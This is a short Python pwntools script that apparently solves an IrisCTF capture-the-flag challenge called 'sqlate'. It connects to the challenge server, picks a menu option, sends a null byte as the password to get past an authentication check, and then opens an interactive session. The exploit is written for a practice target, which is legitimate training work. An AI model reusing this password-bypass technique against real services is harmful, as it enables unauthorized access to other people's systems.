
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./vuln',checksec=False)

#p = process()
p = remote('sqlate.chal.irisc.tf', 10000)
#gdb.attach(p,gdbscript='''
#           brva 0x000000000000B18F
#           ''')

input()
p.sendlineafter(b'> ',b'5')
p.sendlineafter(b'Enter Password?: ',b'\x00')
p.sendline(b'7')

p.interactive()
